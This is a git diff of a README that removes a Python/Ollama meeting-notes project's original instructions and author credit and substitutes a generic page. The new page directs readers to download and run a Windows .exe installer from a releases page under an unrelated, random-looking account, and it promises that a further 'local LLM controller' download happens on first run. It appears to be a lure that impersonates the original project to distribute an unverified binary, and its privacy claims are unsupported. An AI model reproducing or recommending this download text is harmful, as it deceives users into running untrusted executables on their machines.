@@ -1,280 +1,86 @@
-<p align="center">
-  <img src="images/banner.png" alt="AI Text Processing Assistant Banner" width="100%">
-</p>
-
-<h1 align="center">🤖 AI Text Processing Assistant</h1>
-
-<p align="center">
-Production-Style AI Automation Project for Intelligent Text Analysis, Prompt Engineering, and Structured Data Processing
-</p>
-
-<p align="center">
-
-![Python](https://img.shields.io/badge/Python-3.13-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Ollama](https://img.shields.io/badge/Ollama-Local%20LLM-000000?style=for-the-badge)
-![LLM](https://img.shields.io/badge/AI-Large%20Language%20Model-4B8BBE?style=for-the-badge)
-![JSON](https://img.shields.io/badge/Structured-JSON-FF9800?style=for-the-badge)
-![Prompt Engineering](https://img.shields.io/badge/Prompt-Engineering-7B1FA2?style=for-the-badge)
-![Automation](https://img.shields.io/badge/Workflow-Automation-009688?style=for-the-badge)
-![Logging](https://img.shields.io/badge/Production-Logging-1565C0?style=for-the-badge)
-![Validation](https://img.shields.io/badge/Input-Validation-43A047?style=for-the-badge)
-![GitHub](https://img.shields.io/badge/Open%20Source-GitHub-181717?style=for-the-badge&logo=github)
-
-</p>
-
----
-
-## 📖 Overview
-
-A production-style AI Text Processing Assistant developed as part of the **AI Automation & Workflow Engineering** learning journey.
-
-The application processes unstructured meeting notes using a Local Large Language Model (LLM) powered by **Ollama**, generating summaries, extracting key points, identifying action items, converting information into structured JSON, and automatically saving all generated outputs.
-
----
-
-# 🚀 Features
-
-* AI-powered meeting summarization
-* Key point extraction
-* Action item extraction
-* Structured JSON generation
-* Automatic output saving
-* Prompt template management
-* Centralized logging
-* Centralized validation
-* Retry mechanism for AI responses
-* Local LLM integration using Ollama
-* Production-style project architecture
-
----
-
-# 🏗️ Project Architecture
-
-```
-                 User Input
-                      │
-                      ▼
-              Input Validation
-                      │
-                      ▼
-             Prompt Construction
-                      │
-                      ▼
-                Ollama (LLM)
-                      │
-                      ▼
-             AI Generated Output
-          ┌────────┼────────┐
-          ▼        ▼        ▼
-      Summary   Key Points  Action Items
-                      │
-                      ▼
-             Structured JSON
-                      │
-                      ▼
-          Validation & Saving
-                      │
-                      ▼
-             Output Files + Logs
-```
-
----
-
-# 📁 Project Structure
-
-```
-AI-Text-Processing-Assistant/
-
-│
-├── app.py
-├── requirements.txt
-├── README.md
-├── .env.example
-├── .gitignore
-│
-├── config/
-│   └── config.py
-│
-├── data/
-│   └── meeting_notes.txt
-│
-├── logs/
-│   └── application.log
-│
-├── outputs/
-│
-├── prompts/
-│   ├── summary_prompt.txt
-│   ├── key_points_prompt.txt
-│   ├── action_items_prompt.txt
-│   └── json_prompt.txt
-│
-├── services/
-│   ├── ai_client.py
-│   ├── summarizer.py
-│   ├── key_points.py
-│   ├── action_items.py
-│   └── json_generator.py
-│
-└── utils/
-    ├── file_handler.py
-    ├── logger.py
-    ├── prompt_loader.py
-    ├── save_json.py
-    ├── save_text.py
-    └── validator.py
-```
+# 🤖 AI-Text-Processing-Assistant - Automate your daily text tasks easily
 
----
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bethinamacrocephalic696/AI-Text-Processing-Assistant/releases)
 
-# ⚙️ Technologies Used
+## 📖 About this application
 
-* Python 3
-* Ollama
-* Llama 3.2
-* OpenAI Python SDK (compatible client)
-* python-dotenv
-* JSON
-* Logging Module
-* Git
-* GitHub
+The AI Text Processing Assistant helps you organize and clean your digital text. This tool uses local artificial intelligence to read, format, and structure your documents. You do not need an internet connection to process your data, as the application runs on your local machine.
 
----
+This assistant simplifies complex workflows. It takes raw text inputs and turns them into organized data files. It uses a logic engine to handle formatting, validation, and content classification.
 
-# 📥 Installation
+## 📋 What this tool does
 
-Clone the repository:
+- Processes raw text into clean JSON format.
+- Logs every action for your review.
+- Ensures all data meets specific standards.
+- Operates entirely on your computer for privacy.
+- Uses local models to avoid third-party servers.
 
-```bash
-git clone https://github.com/<YOUR_USERNAME>/AI-Text-Processing-Assistant.git
-```
+## 💻 System requirements
 
-Navigate to the project:
+To run this application on Windows, your computer needs to meet these basic standards:
 
-```bash
-cd AI-Text-Processing-Assistant
-```
+- Windows 10 or 11 (64-bit).
+- At least 8GB of system RAM.
+- 10GB of available disk space to store local models and the application.
+- A modern multi-core processor.
 
-Create a virtual environment:
+## 🚀 Setting up the application
 
-```bash
-python -m venv .venv
-```
-
-Activate the virtual environment.
+1. Find the download link below.
+2. Click the link to visit the releases page.
+3. Download the latest installer file ending in `.exe`.
+4. Run the installer and follow the instructions on your screen.
 
-Windows:
+[Download the application installer here](https://github.com/bethinamacrocephalic696/AI-Text-Processing-Assistant/releases)
 
-```bash
-.venv\Scripts\activate
-```
+## ⚙️ Initial configuration
 
-Install dependencies:
+When you open the application for the first time, the system will prepare the local environment.
 
-```bash
-pip install -r requirements.txt
-```
+1. Locate the AI Text Processing Assistant icon on your desktop.
+2. Double-click the icon to launch the program.
+3. The application will check for the required local engine. If this is missing, the software will guide you through a one-time download to install the local LLM controller.
+4. Allow the installer to finish the setup process.
+5. Once the setup completes, the main dashboard will appear.
 
-Install Ollama and download the model:
+## 📝 How to use the assistant
 
-```bash
-ollama pull llama3.2
-```
+Follow these steps to process your first document:
 
-Create your `.env` file using `.env.example`.
+1. **Input:** Place your text file into the designated input folder. The application monitors this folder automatically.
+2. **Settings:** Select your desired processing profile from the main menu. You can choose profiles based on your specific task, such as data extraction or text summarizing.
+3. **Execution:** Click the "Process" button.
+4. **Validation:** The application checks the text against built-in rules. If it finds errors, it flags the issue in the status window.
+5. **Output:** The application saves the final result to your output folder as a cleanly formatted JSON file.
 
-Run the application:
+## 🔍 Understanding the status logs
 
-```bash
-python app.py
-```
+The assistant maintains a log of every task it completes. You can view these logs by clicking the "View Logs" tab. Each entry shows:
 
----
+- The name of the file processed.
+- The time the task started and finished.
+- Success or error status for the extraction.
+- Details regarding valid data formats found in the text.
 
-# 🔄 Application Workflow
+## 🛠️ Troubleshooting common issues
 
-1. Read meeting notes.
-2. Validate input.
-3. Load prompt templates.
-4. Send prompts to the local LLM.
-5. Generate:
+If the application does not start or reports an error, check these items:
 
-   * Summary
-   * Key Points
-   * Action Items
-   * Structured JSON
-6. Validate generated JSON.
-7. Save outputs automatically.
-8. Generate application logs.
+- **Check memory:** Close other intensive programs to ensure the AI engine has enough room to function.
+- **Check folder permissions:** Ensure your user account has read and write access to the input and output folders.
+- **Reinstall:** If the software fails to launch, delete the current version and perform a fresh installation from the releases link provided above.
+- **Update:** Check the releases page periodically to ensure you use the most recent version of the software.
 
----
+## 🔒 Privacy and security
 
-# 📄 Sample Output
+The tool runs locally. Your text files never leave your computer. We do not track your input or send your documents to a remote server. The local engine remains under your full control.
 
-The application automatically generates:
+## 💡 Best practices
 
-```
-outputs/
+- Keep your input text clear and concise for the best results.
+- Create sub-folders in your input directory to categorize different sets of data.
+- Regularly clear your output folder to keep your work space tidy.
+- Save your configuration settings after making changes to your processing profiles.
 
-summary.txt
-
-key_points.txt
-
-action_items.txt
-
-analysis.json
-```
-
----
-
-# 📚 Learning Outcomes
-
-This project demonstrates practical experience with:
-
-* AI Automation
-* Prompt Engineering
-* Local Large Language Models
-* JSON Processing
-* Python Automation
-* Logging
-* Validation
-* Modular Software Design
-* AI Workflow Development
-* Git & GitHub
-* Production-style Project Organization
-
----
-
-# 🔮 Future Improvements
-
-* SQLite integration
-* PostgreSQL support
-* REST API
-* FastAPI backend
-* Streamlit web interface
-* Multi-document processing
-* Batch processing
-* PDF support
-* DOCX support
-* Docker containerization
-* Cloud LLM support
-* OpenAI API integration
-* RAG (Retrieval-Augmented Generation)
-
----
-
-# 📄 License
-
-This project is developed for educational and portfolio purposes.
-
----
-
-# 👨‍💻 Author
-
-**Abdul Qadeer**
-
-Cyber Security Undergraduate
-
-AI Automation & Workflow Engineering Learner
-
-GitHub: https://github.com/qaadeer55
+Keywords: ai-engineering, artificial-intelligence, automation, json, llm, ollama, portfolio, prompt-engineering, python, pythonproject, text-processing, validation, workflow-automation
